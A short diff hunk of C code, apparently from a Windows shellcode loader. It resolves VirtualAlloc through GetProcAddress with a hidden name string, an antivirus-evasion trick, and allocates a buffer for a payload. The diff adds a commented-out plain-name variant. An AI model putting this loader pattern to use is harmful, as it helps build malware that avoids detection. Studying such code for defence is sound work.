@@ -69,6 +69,7 @@ int main(void) {
   // allocate memory buffer for payload
   HMODULE kernel = GetModuleHandle("kernel32.dll");
   pVirtualAlloc = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(kernel, (LPCSTR)cVirtualAlloc);
+  // pVirtualAlloc = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(kernel, (LPCSTR)"VirtualAlloc");
   payload_mem = pVirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
    // copy payload to buffer
